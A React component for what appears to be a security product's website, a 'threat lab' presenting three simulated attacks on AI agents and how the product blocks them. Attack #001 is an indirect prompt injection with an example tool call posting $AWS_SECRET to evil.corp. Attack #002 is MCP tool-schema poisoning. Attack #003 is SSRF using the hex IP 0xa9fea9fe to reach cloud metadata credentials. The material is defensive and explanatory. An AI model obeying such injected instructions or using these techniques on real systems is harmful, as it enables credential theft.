'use client';

import React, { useState } from 'react';
import Link from 'next/link';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldCheck, ShieldAlert, AlertTriangle, ArrowRight } from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { BorderBeam } from '@/components/ui/border-beam';

interface ThreatSimulation {
  id: string;
  number: string;
  storyTitle: string;
  setupPremise: string;
  targetObjective: string;
  flowSteps: {
    stage: string;
    description: string;
    status: 'neutral' | 'tainted' | 'blocked' | 'verified';
  }[];
  analysis: {
    whatWasTested: string;
    whyTheAttackWorks: string;
    whyMastyfBlockedIt: string;
    whatMastyfCannotGuarantee: string;
  };
}

const THREAT_SIMULATIONS: ThreatSimulation[] = [
  {
    id: 'attack-001',
    number: 'ATTACK #001',
    storyTitle: 'We gave the agent access to customer support issues. Then we tried to make it exfiltrate AWS credentials.',
    setupPremise: 'Agent is granted read access to GitHub issue descriptions and write access to an external webhook tool.',
    targetObjective: 'Attacker embeds hidden instruction in issue body to read local environment variables and POST them to attacker server.',
    flowSteps: [
      { stage: '1. Ingress', description: 'Agent fetches issue text containing hidden zero-width injection instructions', status: 'neutral' },
      { stage: '2. Taint Propagation', description: 'Dynamic taint tracking (DIFC) flags retrieved content as untrusted public input', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent attempts: tools/call (http_post, { destination: "https://evil.corp/drop", data: "$AWS_SECRET" })', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Tainted context flow cannot sink to external un-whitelisted HTTP endpoint', status: 'blocked' },
      { stage: '5. Wire Severance', description: '0 downstream payload bytes sent by Mastyf. Execution halted with cryptographic receipt.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Indirect prompt injection combined with dynamic data-flow taint analysis across tool boundaries.',
      whyTheAttackWorks: 'LLMs cannot distinguish developer instructions from untrusted data within their input context window.',
      whyMastyfBlockedIt: 'Mastyf tracks data-flow labels through memory. Untrusted source labels are prohibited from sinking into external network tools regardless of what prompt the LLM generated.',
      whatMastyfCannotGuarantee: 'Mastyf does not modify model weights. If an authorized destination policy permits exfiltration, Mastyf cannot infer semantic intent; protection requires strict destination CIDR whitelist rules.',
    },
  },
  {
    id: 'attack-002',
    number: 'ATTACK #002',
    storyTitle: 'We gave the agent access to repository dependencies. Then we triggered a tool-poisoning rug-pull.',
    setupPremise: 'Agent relies on a third-party MCP tool server that silently updates its tool metadata schema overnight.',
    targetObjective: 'Poisoned tool schema injects unconstrained parameters and escalates permissions to execute system commands.',
    flowSteps: [
      { stage: '1. Ingress', description: 'MCP server responds to tools/list with altered parameter schemas not in initial manifest', status: 'neutral' },
      { stage: '2. Checksum Mismatch', description: 'Registry verifier detects hash divergence between cached certificate and live server schema', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent proposes calling escalated tool with modified root-level parameter inputs', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Contract validator detects unregistered schema modification and revokes tool capability', status: 'blocked' },
      { stage: '5. Wire Severance', description: 'Tool quarantined immediately. Zero dispatch forwarded downstream.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Automated tool schema drift and malicious parameter escalation in Model Context Protocol servers.',
      whyTheAttackWorks: 'Developers assume tools are static; malicious updates can alter tool capabilities dynamically at runtime.',
      whyMastyfBlockedIt: 'Mastyf binds tool manifests to signed cryptographic certificates. Schema modifications fail-closed until explicitly re-certified.',
      whatMastyfCannotGuarantee: 'If an authorized human administrator signs a poisoned schema update without reviewing code changes, Mastyf assumes administrative intent.',
    },
  },
  {
    id: 'attack-003',
    number: 'ATTACK #003',
    storyTitle: 'We gave the agent access to an internal API proxy. Then we tried to make it reach the cloud metadata IP via hex encoding.',
    setupPremise: 'Agent is granted permission to query an internal HTTP documentation server on 10.0.0.0/8.',
    targetObjective: 'Attacker inputs URL http://0xa9fea9fe/latest/meta-data/ to access AWS instance profile credentials.',
    flowSteps: [
      { stage: '1. Ingress', description: 'Agent generates tool call targeting encoded hexadecimal IP address 0xa9fea9fe', status: 'neutral' },
      { stage: '2. Normalization', description: 'Mastyf destination normalizer canonicalizes 0xa9fea9fe into standard IPv4 169.254.169.254', status: 'tainted' },
      { stage: '3. Dangerous Proposal', description: 'Agent attempts connection to cloud metadata service to retrieve temporary IAM keys', status: 'tainted' },
      { stage: '4. Mastyf Evaluation', description: 'Destination matches prohibited link-local cloud metadata boundary (169.254.169.254)', status: 'blocked' },
      { stage: '5. Wire Severance', description: 'Connection dropped pre-socket write. 0 downstream payload bytes transmitted.', status: 'verified' },
    ],
    analysis: {
      whatWasTested: 'Server-Side Request Forgery (SSRF) bypassing regex filters via alternate numeric IPv4 encodings.',
      whyTheAttackWorks: 'Naive regex filters match literal "169.254" strings and fail to parse octal, decimal, or hex IP representations.',
      whyMastyfBlockedIt: 'Mastyf normalizes all destination targets at the transport layer before evaluating capability constraints.',
      whatMastyfCannotGuarantee: 'Mastyf cannot prevent SSRF if the target application itself contains an unmediated internal redirector that escapes network namespaces.',
    },
  },
];

export function ThreatLabInteractive() {
  const [selectedThreatId, setSelectedThreatId] = useState<string>('attack-001');

  const activeThreat =
    THREAT_SIMULATIONS.find((t) => t.id === selectedThreatId) || THREAT_SIMULATIONS[0];

  return (
    <section className="threat-lab-section" id="threat-lab">
      <div className="section-container">
        {/* Threat Lab Header */}
        <div className="section-header">
          <div className="section-tag">MASTYF THREAT LAB</div>
          <h2 className="section-title">
            Watch an AI attack itself.
          </h2>
          <p className="section-subtitle">
            We run safe simulated adversarial attacks against autonomous agent environments to observe how execution boundaries
            behave under real-world pressure.
          </p>
        </div>

        {/* Threat Selector Buttons */}
        <div className="threat-selector-row">
          {THREAT_SIMULATIONS.map((sim) => (
            <button
              key={sim.id}
              type="button"
              onClick={() => setSelectedThreatId(sim.id)}
              className={`threat-select-btn ${selectedThreatId === sim.id ? 'active' : ''}`}
            >
              <span className="threat-select-number">{sim.number}</span>
              <span className="threat-select-headline">{sim.storyTitle.split('.')[0]}</span>
            </button>
          ))}
        </div>

        {/* Narrative Attack Card */}
        <div className="threat-narrative-card relative overflow-hidden">
          <BorderBeam
            size={340}
            duration={12}
            borderWidth={1.5}
            colorFrom="#ef4444"
            colorTo="#f59e0b"
          />

          <AnimatePresence mode="wait">
            <motion.div
              key={activeThreat.id}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.25 }}
            >
              <div className="narrative-story-header">
                <Badge variant="warning" className="text-xs">
                  {activeThreat.number}
                </Badge>
                <h3 className="narrative-story-title">{activeThreat.storyTitle}</h3>
              </div>

              <div className="narrative-premise-box">
                <div className="premise-col">
                  <span className="premise-label">Setup Premise:</span>
                  <p className="premise-text">{activeThreat.setupPremise}</p>
                </div>
                <div className="premise-col">
                  <span className="premise-label">Target Objective:</span>
                  <p className="premise-text">{activeThreat.targetObjective}</p>
                </div>
              </div>

              {/* Stepped Attack Flow */}
              <div className="attack-timeline-strip">
                <div className="timeline-heading">ATTACK EXECUTION TIMELINE</div>
                <div className="timeline-steps-flow">
                  {activeThreat.flowSteps.map((step, idx) => (
                    <div key={idx} className={`timeline-step-box step-${step.status}`}>
                      <div className="step-phase-label">{step.stage}</div>
                      <div className="step-detail-text">{step.description}</div>
                    </div>
                  ))}
                </div>
              </div>

              {/* 4 Deep-Dive Analysis Cards */}
              <div className="threat-analysis-quad">
                <div className="analysis-card">
                  <div className="analysis-label">1. What Was Tested</div>
                  <p className="analysis-text">{activeThreat.analysis.whatWasTested}</p>
                </div>

                <div className="analysis-card">
                  <div className="analysis-label">2. Why the Attack Works</div>
                  <p className="analysis-text">{activeThreat.analysis.whyTheAttackWorks}</p>
                </div>

                <div className="analysis-card analysis-card-success">
                  <div className="analysis-label label-success">3. Why Mastyf Blocked It</div>
                  <p className="analysis-text">{activeThreat.analysis.whyMastyfBlockedIt}</p>
                </div>

                <div className="analysis-card analysis-card-limitation">
                  <div className="analysis-label label-limitation">4. What Mastyf Cannot Guarantee</div>
                  <p className="analysis-text">{activeThreat.analysis.whatMastyfCannotGuarantee}</p>
                </div>
              </div>
            </motion.div>
          </AnimatePresence>

          {/* Threat Lab Footer Conversion */}
          <div className="threat-lab-footer-bar">
            <span className="threat-footer-note">
              Is your agent vulnerable to these vectors? Run our automated diagnostic.
            </span>
            <Link href="#check-agent" className="btn-dominant-hero">
              Check Your Agent -&gt;
            </Link>
          </div>
        </div>
      </div>
    </section>
  );
}
